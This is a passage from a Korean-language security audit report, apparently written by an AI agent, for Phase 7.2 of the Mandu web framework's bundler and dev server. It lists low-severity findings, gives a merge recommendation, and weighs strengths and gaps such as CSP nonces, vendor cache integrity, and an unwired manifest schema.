| 5 | **L-03 `__MANDU_ROUTER_REVALIDATE__` dev-only 분기** | 🟢 선택 | Phase 7.2 R3 신규 |
| 6 | **L-04 prod 에서 `X-Mandu-HDR` echo 억제** | 🟢 선택 | Phase 7.2 R3 신규 |
| 7 | **I-01 `window.__MANDU_HDR_DISABLED__` 주입 경로** — bootScript 또는 HMR script 에 서버 env 전달 | 🟢 선택 | Phase 7.2 R3 신규 |

---

## 9. 결론 / Merge 권장

**Critical 0 / High 0. Phase 7.2 merge 를 차단할 보안 이슈 없음.**

### 긍정 측면

1. **7.1.M-01 완전 닫힘**: CSP nonce 지원이 `ssr.ts` + `streaming-ssr.ts` 양쪽에 일관되게 구현됐고 `MANDU_CSP_NONCE=0` opt-out + WeakMap 기반 HTML ↔ 헤더 동기화 + 128-bit 엔트로피 + per-render 생성. 28 개 테스트 (csp-nonce.test.ts) 전수 통과.
2. **7.1.L-01, L-03 완전 닫힘**: `validateAcceptFileUrl` 2 KB URL cap + unsafe sequence 거부, `SLOT_PATH_REGEX` + `startsWith(rootDir + sep)` 이중 방어. 각각 `url-cap-and-slot-regex.test.ts` 에서 검증.
3. **Vendor cache 설계 우수**: SHA-256 + size + 5-field version key + manifest-last 쓰기 순서 + gitignored 위치 + 10 MB 상한 + MANDU_VENDOR_CACHE=0 escape hatch. 455 줄 테스트 커버리지.
4. **HDR 은 새 network-layer 공격면 없음**: CORS 기본 `false` + `X-Mandu-HDR` 커스텀 헤더 → cross-origin 불가. WS broadcast 는 Phase 7.0.S Origin allowlist 하에서 내부에서만 유통. client fetch URL 은 `window.location` 고정으로 외부 host 주입 불가능.
5. **Phase 7.0.S + 7.1 방어막 보존**: Origin allowlist / localhost binding / rate limit / /restart 보호 / dispatch escape (JSON.stringify + split</) 모두 Phase 7.2 3 에이전트 병렬 개발 중 훼손 없이 유지.
6. **공급망 정결**: 새 npm 의존성 도입 없음 (zod 는 기존 의존성). `bun audit` 0 건 (Phase 7.1 에서 확인된 happy-dom 경고만 지속 — Phase 7.2 무관 devDep).
7. **테스트 커버**: Phase 7.2 신규 234 + 기존 bundler 전수 = 모두 pass, 0 fail. 신규 7 개 test 파일 × 수백 expect.

### 부정 측면

1. **M-01 schema wire-up 미완**: 구현과 테스트는 완벽한데 production 경로에서 호출 안 함. 7.1.M-02 의 재발. Merge 막진 않지만 Phase 7.3 에서 가장 먼저 다뤄야 함.
2. **M-02 vendor cache TOCTOU**: 이론적 공격 경로 + 방어 추가 비용 무시 가능. merge 후 즉시 patch 가능.
3. **opt-out 이중 방어 미완성**: `MANDU_HDR=0` 은 서버 broadcast skip 으로 유효하지만 클라이언트 `window.__MANDU_HDR_DISABLED__` 는 dead code (읽기만 있고 설정 없음). 기능 결함이 아닌 불필요한 복잡도.

### 다음 단계 (post-merge)

1. **Phase 7.2 merge 진행** — 본 감사 기준 차단 사유 없음.
2. **Phase 7.3 RFC 초안** (권장 순서):
   - M-01 schema wire-up (ssr.ts / streaming-ssr.ts / build.ts 3 곳)
   - M-02 vendor cache TOCTOU 재검증
   - L-02 + I-01 merge (slotPath 상대경로화 + `window.__MANDU_HDR_DISABLED__` bootScript 주입)
3. **문서 보강**: `docs/bun/phase-7-2-benchmarks.md` 에 "manifest tamper 방어는 Phase 7.3 에서 완성; 현재 inline `<script>` escape 한 겹만 유효" 명시.

---

## 10. 감사자 노트

Phase 7.2 는 보기 드물게 3 에이전트 (A/B/C) 가 `dev.ts` 를 동시 편집하면서도 conflict 없이 merge 된 round. Agent B 가 line 1722+ 에서 HMR client script 확장, Agent C 가 line 415~460 에서 slotModule regex 추가, Agent A 는 `build.ts` 전담 — 파일 충돌 관리가 팀 플랜 §4 대로 작동했다.

Phase 7.2 특유 공격면은 세 가지였다:
1. **HDR `X-Mandu-HDR` / `?_data=1` 경로** — 새 표면이지만 CORS + 커스텀 헤더 preflight 로 외부 공격 불가 판정.
2. **Vendor cache 디스크 파일** — SHA-256 tamper 감지가 일급. 단 restore 단계 재검증은 follow-up.
3. **CSP nonce inline preamble** — nonce 생성/전달/헤더 emit 3 경로가 모두 정상 wire-up. 테스트로 byte-identical 검증.

네 번째 잠재 공격면 — **manifest tamper → fastRefresh URL injection** — 이 Phase 7.1 M-02 에서 Medium 으로 스코어됐고 Phase 7.2 가 "구현 완료" 를 선언했지만 감사 시점에는 **구현만 있고 wire-up 없음** 이 드러났다. 이 점이 감사의 주요 가치: 구현 vs 통합의 차이를 테스트 커버가 잡지 못했다는 교훈. Phase 7.3 에서 가장 먼저 다뤄야 함.

감사 대상 코드 약 3,500 줄 신규 + 변경:
- `vendor-cache.ts` 516 + `vendor-cache-types.ts` 130 (646)
- `manifest-schema.ts` 301 (구현 + 테스트)
- `hmr-client.ts` +75 / `ssr.ts` +296 / `streaming-ssr.ts` +217 (HDR + CSP nonce)
- `dev.ts` +208 / `build.ts` +141 (slot regex + vendor cache 통합)
- `cli/dev.ts` +93 (HDR broadcast)
- `scripts/cli-bench.ts` 406 + `scripts/b5-live-bench.ts` 558 (964)
- 새 테스트 7 파일 2,187 줄

Phase 7.0 의 4,500 줄 + Phase 7.1 의 2,500 줄 대비 최대 볼륨. 3 에이전트 병렬에도 불구하고 기존 보안 블록을 훼손하지 않은 것은 긍정적.

**Merge 판정**: `bun run typecheck` 4 packages clean + Phase 7.2 bundler 테스트 234 pass / 0 fail 확인. **merge 가능**.

---

*감사 시작: 2026-04-20, 종료: 2026-04-20*
*감사자: Agent E (security-engineer) — Phase 7.2.R3*
*감사 대상 커밋: `bfdca8d` (R2 cold/warm 재판정 + B5 live E2E + HDR DOM preservation)*
